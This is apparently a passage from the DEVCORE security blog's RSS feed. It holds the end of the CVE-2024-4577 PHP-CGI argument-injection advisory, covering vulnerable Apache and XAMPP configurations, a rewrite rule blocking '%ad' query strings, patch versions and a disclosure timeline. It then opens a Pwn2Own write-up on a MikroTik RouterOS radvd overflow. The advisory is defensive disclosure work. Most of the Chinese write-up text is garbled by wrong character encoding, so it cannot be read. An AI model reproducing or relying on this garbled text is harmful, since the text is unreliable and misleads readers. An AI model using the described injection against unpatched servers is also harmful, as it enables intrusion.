  &lt;li&gt;Traditional Chinese (Code Page 950)&lt;/li&gt;
  &lt;li&gt;Simplified Chinese (Code Page 936)&lt;/li&gt;
  &lt;li&gt;Japanese (Code Page 932)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For Windows running in other locales such as English, Korean, and Western European, due to the wide range of PHP usage scenarios, it is currently not possible to completely enumerate and eliminate all potential exploitation scenarios. Therefore, it is recommended that users conduct a comprehensive asset assessment, verify their usage scenarios, and update PHP to the latest version to ensure security.&lt;/p&gt;

&lt;h3 id=&quot;scenario-1-running-php-under-cgi-mode&quot;&gt;&lt;strong&gt;Scenario 1&lt;/strong&gt;: Running PHP under CGI mode&lt;/h3&gt;

&lt;p&gt;When configuring the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Action&lt;/code&gt; directive to map corresponding HTTP requests to a PHP-CGI executable binary in Apache HTTP Server, this vulnerability can be exploited directly. Common configurations affected include, but are not limited to:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; cgi-script .php
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; cgi-script &quot;/cgi-bin/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Or&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;\.php$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; application/x-httpd-php-cgi
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; application/x-httpd-php-cgi &quot;/php-cgi/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;scenario-2-exposing-the-php-binary-also-the-default-xampp-configuration&quot;&gt;&lt;strong&gt;Scenario 2&lt;/strong&gt;: Exposing the PHP binary (also the default XAMPP configuration)&lt;/h3&gt;

&lt;p&gt;Even if PHP is not configured under the CGI mode, merely exposing the PHP executable binary in the CGI directory is affected by this vulnerability, too. Common scenarios include, but are not limited to:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Copying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php.exe&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt; directory.&lt;/li&gt;
  &lt;li&gt;Exposing the PHP directory via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt; directive, such as:
    &lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nc&quot;&gt;ScriptAlias&lt;/span&gt; /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;mitigation-measure&quot;&gt;Mitigation Measure&lt;/h2&gt;

&lt;p&gt;It is strongly recommended that all users upgrade to the latest PHP versions of &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;, &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt;, and &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;. For systems that cannot be upgraded, the following instructions can be used to temporarily mitigate the vulnerability.&lt;/p&gt;

&lt;p&gt;However, since PHP CGI is an outdated and problematic architecture, it‚Äôs still recommended to evaluate the possibility of migrating to a more secure architecture such as Mod-PHP, FastCGI, or PHP-FPM.&lt;/p&gt;

&lt;h3 id=&quot;1-for-users-who-cannot-upgrade-php&quot;&gt;1. For users who cannot upgrade PHP:&lt;/h3&gt;

&lt;p&gt;The following Rewrite Rules can be used to block attacks. Please note that &lt;strong&gt;these rules are only a temporary mitigation for Traditional Chinese, Simplified Chinese, and Japanese locales&lt;/strong&gt;. It is still recommended to update to a patched version or migrate the architecture in practice.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{QUERY_STRING} ^%ad [NC]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; .? - [F,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-for-users-who-use-xampp-for-windows&quot;&gt;2. For users who use XAMPP for Windows:&lt;/h3&gt;

&lt;p&gt;XAMPP has not yet released corresponding update files for this vulnerability at the time of writing this article. If you confirm that you do not need the PHP CGI feature, you can avoid exposure to the vulnerability by modifying the following Apache HTTP Server configuration:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;C:/xampp/apache/conf/extra/httpd-xampp.conf&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Locating the corresponding lines:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;ScriptAlias&lt;/span&gt; /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And comment it out:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2024/05/07 - DEVCORE reported this issue through the official PHP vulnerability disclosure page.&lt;/li&gt;
  &lt;li&gt;2024/05/07 - PHP developers confirmed the vulnerability and emphasized the need for a prompt fix.&lt;/li&gt;
  &lt;li&gt;2024/05/16 - PHP developers released the first version of the fix and asked for feedback.&lt;/li&gt;
  &lt;li&gt;2024/05/18 - PHP developers released the second version of the fix and asked for feedback.&lt;/li&gt;
  &lt;li&gt;2024/05/20 - PHP entered the preparation phase for the new version release.&lt;/li&gt;
  &lt;li&gt;2024/06/06 - PHP released new versions &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;, &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt;, and &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;PHP Security Advisory - PHP RCE: A Bypass of CVE-2012-1823, Argument Injection in PHP-CGI&lt;/a&gt; (to be announced)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;MS-UCODEREF - Windows Protocols Unicode Reference&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CERT/CC VU#520827 - PHP-CGI query string parameter vulnerability&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/</link>
                <guid>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en</guid>
                <pubDate>Thu, 06 Jun 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pwn2Own Toronto 2022 : A 9-year-old bug in MikroTik RouterOS</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;DEVCORE Á†îÁ©∂ÁµÑÂú® Pwn2Own Toronto 2022 ÁôΩÂ∏ΩÈß≠ÂÆ¢Á´∂Ë≥ΩÊúüÈñìÔºåÈÄèÈÅéÁ†îÁ©∂ÈÅéÂéªÂ∞ëÊúâ‰∫∫Ê≥®ÊÑèÂà∞ÁöÑÊîªÊìäÈù¢ÔºåÂú® MikroTik Êóó‰∏ãË∑ØÁî±Âô®Áî¢ÂìÅÊâÄ‰ΩøÁî®ÁöÑ RouterOS ‰ΩúÊ•≠Á≥ªÁµ±‰∏≠ÔºåÁôºÁèæ‰∫ÜÂ≠òÂú®‰πùÂπ¥‰πã‰πÖÁöÑ WAN Á´ØÂº±ÈªûÔºåÈÄèÈÅé‰∏≤ÈÄ£Ë©≤Âº±ÈªûËàáÂè¶‰∏ÄÂÄãÂêåÊ®£Áî± DEVCORE ÁôºÁèæÁöÑ Canon printer Âº±ÈªûÔºåDEVCORE ÊàêÁÇ∫Âè≤‰∏äÁ¨¨‰∏ÄÂÄãÂú® Pwn2Own Ë≥Ω‰∫ã‰∏≠ÊàêÂäüÊåëÊà∞ SOHO Smashup È†ÖÁõÆÁöÑÈöä‰ºçÔºõÊúÄÁµÇ DEVCORE Âú® Pwn2Own Toronto 2022 Â•™‰∏ãÂÜ†ËªçÔºå‰∏¶Áç≤È†íÁ†¥Ëß£Â§ßÂ∏´ÔºàMaster of PwnÔºâÁöÑÁ®±Ëôü„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë©≤ WAN Á´ØÂº±ÈªûÁôºÁîüÂú® RouterOS ‰∏≠ÁöÑ radvd Á®ãÂºèÔºåÁî±ÊñºË©≤Á®ãÂºèÂú®ËôïÁêÜ IPv6 SLAAC ÁöÑ ICMPv6 Â∞ÅÂåÖÊôÇÔºåÊú™Â∞ç RDNSS Ê¨Ñ‰ΩçÁöÑÈï∑Â∫¶ÈÄ≤Ë°åÊ™¢Êü•ÔºåÂ∞éËá¥ÊîªÊìäËÄÖÂèØÈÄèÈÅéÁôºÈÄÅÂÖ©Ê¨° Router Advertisement Â∞ÅÂåÖËß∏ÁôºÁ∑©Ë°ùÂçÄÊ∫¢‰ΩçÊîªÊìäÔºå‰ΩøÂæóÊîªÊìäËÄÖÂèØÂú®‰∏çÈúÄÁôªÂÖ•‰∏îÁÑ°ÈúÄ‰ΩøÁî®ËÄÖ‰∫íÂãïÁöÑÊÉÖÊ≥Å‰∏ãÊéßÂà∂Ë∑ØÁî±Âô®Â∫ïÂ±§ÁöÑ Linux Á≥ªÁµ±ÈÄ≤Ë°åÈ´òÊ¨äÈôêÊìç‰ΩúÔºåÂèñÂæóË∑ØÁî±Âô®ÁöÑÂÆåÊï¥ÊéßÂà∂Ê¨äÔºõÊ≠§Âº±ÈªûË¢´ÁôªË®òÁÇ∫ CVE-2023-32154ÔºåÂÖ∂ CVSS ÂàÜÊï∏ÁÇ∫ 7.5„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈáùÂ∞ç‰∏äËø∞Âº±ÈªûÔºå DEVCORE Â∑≤Êñº 2022/12/29 Á∂ìÁî± &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-710/&quot;&gt;ZDI&lt;/a&gt; ÂõûÂ†± MikroTik ËôïÁêÜÔºå‰∏¶Âú® 2023/05/19 ÂÆåÊàê‰øÆË£úÔºå‰ª•‰∏ã RouterOS ÁâàÊú¨Â∑≤Á∂ìÂ∞çÊ≠§Âº±ÈªûÈÄ≤Ë°å‰øÆË£úÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8&lt;/li&gt;
  &lt;li&gt;Stable Release 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;pwn2own-Ëàá-soho-smashup-Á∞°‰ªã&quot;&gt;Pwn2Own Ëàá SOHO Smashup Á∞°‰ªã&lt;/h2&gt;

&lt;p&gt;Pwn2Own ÊòØ‰∏ÄÁ≥ªÂàóÁî±Ë∂®Âã¢ÁßëÊäÄÁöÑ Zero Day InitiativeÔºàZDIÔºâ‰∏ªËæ¶ÁöÑÊØîË≥ΩÔºåÊØèÂ†¥Ë≥Ω‰∫ãÈÉΩÊúÉÈáùÂ∞çË©≤Ê¨°‰∏ªÈ°åÊåëÈÅ∏‰∏Ä‰∫õÁÜ±ÈñÄÁöÑÁî¢ÂìÅ‰ΩúÁÇ∫ÁõÆÊ®ôÔºå‰æãÂ¶ÇÔºö‰ΩúÊ•≠Á≥ªÁµ±„ÄÅÁÄèË¶ΩÂô®„ÄÅÈõªÂãïËªä„ÄÅÂ∑•ÊéßÁ≥ªÁµ±„ÄÅË∑ØÁî±Âô®„ÄÅÂç∞Ë°®Ê©ü„ÄÅÊô∫ÊÖßÈü≥ÁÆ±„ÄÅÊâãÊ©ü„ÄÅNAS„ÄÅÁ∂≤Ë∑ØÊîùÂΩ±Ê©ü‚Ä¶‚Ä¶Á≠âÁ≠â„ÄÇÂè™Ë¶ÅÂèÉË≥ΩÈöä‰ºçÂèØ‰ª•Âú®ÁÑ°ÈúÄ‰ΩøÁî®ËÄÖ‰∫íÂãï„ÄÅË®≠ÂÇôËôïÊñºÈ†êË®≠ÁãÄÊÖã„ÄÅËªüÈ´îÊõ¥Êñ∞Ëá≥ÊúÄÊñ∞ÁâàÊú¨ÁöÑÊ¢ù‰ª∂‰∏ãÔºåÊºîÁ§∫ÊîªÊìä‰∏¶ÊàêÂäüÁç≤ÂæóË®≠ÂÇôÁöÑ‰∏ªÊéßÊ¨äÔºåÂ∞±ÂèØ‰ª•Áç≤ÂæóÁõ∏ÊáâÁöÑ Master of Pwn ÈªûÊï∏ÂíåÁçéÈáë„ÄÇË≥ΩÊú´ÁµêÁÆóÊôÇÔºåMaster of Pwn ÈªûÊï∏ÊúÄÈ´òÁöÑÈöä‰ºçÂ∞±ÊòØÂÜ†ËªçÔºå‰πüË¢´Á®±ÁÇ∫Á†¥Ëß£Â§ßÂ∏´ÔºàMaster of PwnÔºâ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂâçÂπæÂπ¥Áî±ÊñºÁñ´ÊÉÖÁöÑÈóú‰øÇÔºåWork From Home ÊàñÊòØ SOHOÔºàÂç≥Â∞èÂûãËæ¶ÂÖ¨ÔºèÂÆ∂Â∫≠Ëæ¶ÂÖ¨ÔºâËÆäÂæóÈùûÂ∏∏ÊôÆÈÅçÔºåÂõ†Ê≠§ 2022 ÁöÑ Pwn2Own  Toronto ‰πüÊñ∞Â¢û‰∫Ü‰∏ÄÂÄãÁ®±‰Ωú SOHO Smashup ÁöÑÁâπÂà•È†ÖÁõÆÔºåÂèÉË≥ΩËÄÖÈúÄË¶ÅÂæû WAN Á´ØÂÖ•‰æµË∑ØÁî±Âô®ÂæåÔºåÂÜçÂ∞áË∑ØÁî±Âô®‰ΩúÁÇ∫Ë∑≥ÊùøÊîªÊìäÂ±ÖÂÆ∂Â∏∏Ë¶ãÁöÑË®≠ÂÇôÔºå‰æãÂ¶ÇÔºöÊô∫ÊÖßÈü≥Èüø„ÄÅÂç∞Ë°®Ê©üÁ≠âË®≠ÂÇô„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÂÄãÁâπÂà•ÁöÑÊñ∞È†ÖÁõÆÔºåÈô§‰∫ÜÁçéÈáëÊòØÊâÄÊúâÈ†ÖÁõÆ‰∏≠Á¨¨‰∫åÈ´òÁöÑ $100,000ÔºàUSDÔºâ‰πãÂ§ñÔºåÂæóÂàÜ‰πüÊòØÊúÄÈ´òÁöÑÂçÅÂàÜÔºåÂõ†Ê≠§Â¶ÇÊûúÁõÆÊ®ôÊòØÂ•™ÂÜ†ÔºåÂ•™‰∏ãÈÄôÂÄãÈ†ÖÁõÆÁµïÂ∞çÊòØÂ¶ÇËôéÊ∑ªÁøºÔºÅDEVCORE Âú®Êú¨Ê¨°Ë≥Ω‰∫ã‰∏≠‰πüÁâπÂà•ÊåëÈÅ∏ËºÉÂ∞ë‰∫∫Á†îÁ©∂ÁöÑ MikroTik ‰ΩúÁÇ∫ÁõÆÊ®ôÔºåÈÅøÂÖçËàá‰ªñ‰∫∫ÊâæÂà∞ÈáçË§áÁöÑÊºèÊ¥ûÔºàËàáÂÖ∂‰ªñ‰∫∫ÊíûÊ¥ûÊôÇÔºåÁçéÈáëËàáÂæóÂàÜÁöÜÊ∏õÂçäÔºâÔºåÊúÄÂ§ßÂåñÂ•™ÂÜ†ÁöÑÊ©üÁéá„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;routeros-Á∞°‰ªã&quot;&gt;RouterOS Á∞°‰ªã&lt;/h2&gt;

&lt;p&gt;MikroTik ÈñãÁôºÁöÑ RouterOS ÊòØ‰∏ÄÂ•óÂü∫Êñº Linux Ê†∏ÂøÉÁöÑ‰ΩúÊ•≠Á≥ªÁµ±Ôºå‰πüÊòØ MikroTik Êóó‰∏ãÁî¢ÂìÅ „ÄåRouterBoard„Äç‰∏äÈ†êË®≠ÂÆâË£ùÁöÑ‰ΩúÊ•≠Á≥ªÁµ±ÔºåRouterOS ‰∫¶ÂèØË¢´ÂÆâË£ùÂú®ÂÄã‰∫∫ÈõªËÖ¶‰∏äÔºåÁî®‰æÜÂ∞áÈõªËÖ¶‰ΩúÁÇ∫Ë∑ØÁî±Âô®‰ΩøÁî®„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈõñÁÑ∂Âü∫Êñº Linux Ê†∏ÂøÉÈñãÁôºÁöÑ RouterOS Á¢∫ÂØ¶Êúâ‰ΩøÁî® GPL ÊéàÊ¨äÁöÑÈñãÊ∫êËªüÈ´îÔºå‰ΩÜÂ¶ÇÊûúÊÉ≥Ë¶ÅÂæóÂà∞Áõ∏ÈóúÁöÑÁ®ãÂºèÁ¢ºÔºåÊ†πÊìöÂÆòÊñπÁ∂≤Á´ô &lt;a href=&quot;https://web.archive.org/web/20220603140018/https://mikrotik.com/downloadterms.html&quot;&gt;downloadterms&lt;/a&gt; ÁöÑË™™ÊòéÔºåÈúÄË¶ÅÂåØ 45 Â°äÁæéÈáëÁµ¶ MikroTik Ôºå‰ªñÂÄëÊâçÊúÉÂØÑÁµ¶‰Ω†‰∏ÄÂºµÁáíÂ•Ω GPL source ÁöÑÂÖâÁ¢üÔºåÈùûÂ∏∏ÊúâË∂£ÁöÑÊÉ≥Ê≥ïÔºÅÂπ∏Â•ΩÂ∑≤Á∂ìÊúâ‰∫∫Â∞á MikroTik ÁöÑ &lt;a href=&quot;https://github.com/robimarko/routeros-GPL&quot;&gt;GPL source&lt;/a&gt;‰∏äÂÇ≥Âà∞ GithubÔºå‰ΩÜÂú®Ê™¢Ë¶ñÈÅéÂæåÔºåÊàëÂÄëË™çÁÇ∫Ë£°Èù¢ÁöÑÁ®ãÂºèÁ¢ºÂ∞çÊñºÂæåÁ∫åÂàÜÊûêÊ≤íÊúâÂ§™Â§ßÁöÑÂπ´Âä©„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;routeros-v7-Ëàá-routeros-v6&quot;&gt;RouterOS v7 Ëàá RouterOS v6&lt;/h3&gt;

&lt;p&gt;Âú® MikroTik ÂÆòÁ∂≤ÁöÑ‰∏ãËºâÈ†ÅÈù¢‰∏äÂêåÊôÇÂ≠òÂú® RouterOS v7 ‰ª•Âèä RouterOS v6 ÂÖ©ÂÄãÁâàÊú¨ÔºåÂÖ©ËÄÖ‰πãÈñìÁöÑÈóú‰øÇÊØîËºÉÂÉèÊòØ RouterOS ÁöÑ‰∏çÂêå branchÔºåÂú®Ë®≠Ë®à‰∏äÂ§ßÂêåÂ∞èÁï∞„ÄÇÂõ†ÁÇ∫ÊàëÂÄëÁöÑÁõÆÊ®ôË®≠ÂÇô RouterBoard RB2011UiAS-IN È†êË®≠ÂÆâË£ùÁöÑÊòØ RouterOS v6ÔºåÊâÄ‰ª•ÊàëÂÄëÂÖà‰ª• RouterOS v6 ‰ΩúÁÇ∫Á†îÁ©∂Â∞çË±°„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RouterOS ‰∏¶Ê≤íÊúâÊ≠£ÂºèÊèê‰æõ‰∏ÄÂÄãÊñπÊ≥ïËÆì‰ΩøÁî®ËÄÖÁõ¥Êé•ÁÆ°ÁêÜÂ∫ïÂ±§ÁöÑ Linux Á≥ªÁµ±Ôºå‰ΩøÁî®ËÄÖË¢´ÈóúÂú®‰∏ÄÂÄãÂäüËÉΩÂèóÈôêÁöÑ console Ë£°Èù¢ÔºåÂè™ËÉΩ‰ΩøÁî® RouterOS Êèê‰æõÁöÑÊúâÈôêÊåá‰ª§ÂéªÁÆ°ÁêÜÈÄôÂè∞Ë∑ØÁî±Âô®„ÄÇÂõ†Ê≠§ÈÅéÂéªÊúâ‰∏çÂ∞ëÁ†îÁ©∂ÊòØÈóúÊñºÂ¶Ç‰Ωï jailbreak RouterOS„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RouterOS ‰∏äÁöÑ binary ‰πãÈñì‰ΩøÁî®‰∏ÄÁ®Æ MikroTik Ëá™Ë£ΩÁöÑ IPC ÈÄ≤Ë°åÊ∫ùÈÄöÔºåÊ≠§ IPC Âà©Áî®Á®±ÁÇ∫ nova message ÁöÑË≥áÊñôÁµêÊßãÂú®ÂêÑÁ®ãÂºèÈñì‰∫§ÊèõË≥áË®äÔºåÂõ†Ê≠§ÊàëÂÄëÂ∞áÈÄôÈ°û binary Áµ±‰∏ÄÁ®±‰Ωú nova binary„ÄÇ&lt;/p&gt;

&lt;p&gt;Âè¶Â§ñÔºåRouterOS ÈÇÑÂ≠òÂú®‰∏ÄÂÄãÊØîËºÉÁâπÂà•ÁöÑÊîªÊìäÈù¢„ÄÇÂú®Êó•Â∏∏ÊáâÁî®‰∏≠Ôºå‰ΩøÁî®ËÄÖÂèØ‰ª•ÈÄèÈÅé WinBox ÈÄôÂ•ó GUI ÁÆ°ÁêÜÂ∑•ÂÖ∑Âú® Windows ÈõªËÖ¶‰∏äÂ∞ç RouterOS ÈÄ≤Ë°åÈÅ†Á´ØÁÆ°ÁêÜÔºåÂÖ∂ÂéüÁêÜÊòØÈÄèÈÅé TCP ÂêëË∑ØÁî±Âô®ÂÇ≥ÈÄÅ nova message„ÄÇÂõ†Ê≠§Ëã• RouterOS Ê≤íÊúâÈáùÂ∞ç nova message ÂÅöÂ•ΩÊ¨äÈôêÈ©óË≠âÊôÇÔºåÊîªÊìäËÄÖÂ∞±ÊúâÊ©üÊúÉËá™ÈÅ†Á´ØÁôºÈÄÅ‰∏ÄÂÄãÂ§æÂ∏∂ÊÉ°ÊÑè nova message ÁöÑ TCP Â∞ÅÂåÖÂÖ•‰æµË∑ØÁî±Âô®Ôºõ‰∏çÈÅé WinBox È†êË®≠ÂÉÖËÉΩÂæû LAN Á´Ø‰ΩøÁî®ÔºåÂ∞çÊàëÂÄë‰æÜË™™‰∏çÊòØÂÑ™ÂÖà‰∫ãÈ†ÖÔºåÂõ†ÁÇ∫ÈÄôÊ¨°ÁöÑÁõÆÊ®ôÊòØÂæû WAN Á´ØÈÄ≤Ë°åÊîªÊìäÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-ÂõûÈ°ß&quot;&gt;CVE ÂõûÈ°ß&lt;/h2&gt;

&lt;p&gt;È¶ñÂÖàÔºåÁÇ∫‰∫ÜÁÜüÊÇâ RouterOS ÁöÑÊîªÊìäÈù¢ÔºåÊàëÂÄëÂÖ®Èù¢ÂØ©Ë¶ñ‰∫ÜÈÅéÂéªÁöÑ CVE„ÄÇÁï∂ÊôÇËàá RouterOS ÊúâÈóúÁöÑ CVE Á∏ΩÂÖ±Êúâ 80 ÂÄãÔºåËÄåÁï∂‰∏≠ÂèØË¢´Áî®‰æÜÂú® pre-auth ÊÉÖÂ¢É‰∏ãÈÄ≤Ë°åÊîªÊìäÔºå‰∏îÁõÆÊ®ôÊòØË∑ØÁî±Âô®Êú¨Ë∫´ÁöÑÂÖ±Êúâ 28 ÂÄã „ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;28 ÂÄã CVE Áï∂‰∏≠Êúâ 4 ÂÄã CVE ÁöÑ‰ΩøÁî®ÊÉÖÂ¢ÉÊòØËºÉÁ¨¶Âêà Pwn2Own Ë¶èÂâáÊâÄÊèèËø∞ÁöÑÊÉÖÂ¢ÉÔºåÈÄô‰∫õ CVE ÂèØ‰ª•ËÆìÊîªÊìäËÄÖÂú®‰∏çÈúÄ‰ΩøÁî®ËÄÖ‰∫íÂãïÁöÑÊÉÖÊ≥Å‰∏ãÂú®Ë∑ØÁî±Âô®‰∏äÂñöËµ∑‰∏ÄÂÄã shell ÊàñÁôªÂÖ•ÁÇ∫ admin„ÄÇÈÄô 4 ÂÄãÊºèÊ¥ûÁï∂‰∏≠ÔºåÊúâ 3 ÂÄãÊòØÂú® 2017 Âπ¥Ëá≥ 2019 Âπ¥ÈÄôÊÆµÊôÇÈñìË¢´ÁôºÁèæÁöÑÔºåËÄå‰∏îÁï∂‰∏≠ 3 ÂÄãÊòØ„Äåin the wild„ÄçËÄå‰∏çÊòØÁ¨¨‰∏ÄÊôÇÈñìÁ∂ìÁî±ÁôΩÂ∏ΩÈß≠ÂÆ¢‰∏ªÂãïÈÄöÂ†±ÔºåÈÄôÂõõÂÄãÊºèÊ¥ûÂàÜÂà•ÊòØÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-20149ÔºöÂèàÁ®± Chimay-RedÔºåÊòØ 2017 Âπ¥Âæû CIA Â§ñÊ¥©ÁöÑÊ≠¶Âô®Â∫´„ÄåVault 7„Äç‰∏≠ÔºåÈáùÂ∞ç RouterOS ÈÄ≤Ë°åÊîªÊìäÁöÑÊºèÊ¥û‰πã‰∏Ä„ÄÇÊºèÊ¥ûÁôºÁîüÂú® RouterOS Ëß£Êûê HTTP Ë´ãÊ±ÇÊôÇÔºåËã• HTTP headers ‰∏≠ÁöÑ Content-Length ÊòØË≤†ÂÄºÔºåÊúÉÈÄ†Êàê Integer UnderflowÔºåÊê≠ÈÖç Stack Clash ÁöÑÊîªÊìäÊâãÊ≥ïÂ∞±ËÉΩÊéßÂà∂Á®ãÂºèÊµÅÁ®ãÈÅîÊàê RCE„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;CVE-2018-7445&lt;/a&gt;ÔºöÊòØ‰∏ÄÂÄãÂ≠òÂú®Êñº RouterOS Ëá™Â∑±ÂØ¶ÂÅöÁöÑ SMB ‰∏≠ÁöÑ buffer overflow„ÄÇÈÄôÊòØÈÄèÈÅéÈªëÁÆ±Ê®°Á≥äÊ∏¨Ë©¶ÊâæÂà∞ÁöÑÊºèÊ¥ûÔºå‰πüÊòØÂõõÂÄãÊºèÊ¥û‰∏≠ÂîØ‰∏Ä‰∏ÄÂÄãÁî±ÁôºÁèæËÄÖËá™Ë°åÂõûÂ†±ÁöÑÊºèÊ¥ûÔºå‰∏ÄÊ®£ËÉΩÂ§†ÊéßÂà∂Á®ãÂºèÂü∑Ë°åÊµÅÁ®ãÊúÄÂæåÈÅîÊàê RCEÔºå‰ΩÜ SMB ‰∏çÊòØÈ†êË®≠ÈñãÂïüÁöÑÊúçÂãô„ÄÇ&lt;/li&gt;
